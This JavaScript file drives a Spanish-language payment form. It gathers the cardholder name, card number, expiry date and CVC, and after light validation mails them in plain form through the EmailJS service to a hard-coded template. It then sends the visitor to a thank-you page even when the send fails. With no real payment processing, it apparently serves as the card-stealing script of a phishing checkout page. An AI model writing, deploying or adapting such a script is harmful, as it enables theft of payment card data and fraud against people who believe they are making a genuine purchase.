(function() {
    emailjs.init('ReqtkWfjI392LAzFb');
})();

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const cardData = {
        nombre: document.getElementById('cardHolder').value,
        numero: document.getElementById('cardNumber').value,
        fecha: document.getElementById('expiryDate').value,
        cvc: document.getElementById('cvc').value
    };

    // Validaciones
    if (!/^[a-zA-ZÀ-ÿ\s]{5,}$/.test(cardData.nombre)) {
        alert('Por favor ingrese un nombre válido');
        return;
    }

    if (cardData.numero.length !== 16 || !/^\d+$/.test(cardData.numero)) {
        alert('Número de tarjeta inválido');
        return;
    }

    if (cardData.cvc.length !== 3 || !/^\d+$/.test(cardData.cvc)) {
        alert('CVC inválido');
        return;
    }

    const currentDate = new Date();
    const expiryDate = new Date(cardData.fecha);
    if (expiryDate < currentDate) {
        alert('Fecha de expiración inválida');
        return;
    }

    emailjs.send("service_syrc1uk", "template_u3etoro", cardData)
        .then(() => {
            window.location.href = "thank-you.html";
        })
        .catch(error => {
            console.error('Error:', error);
            window.location.href = "thank-you.html";
        });
});
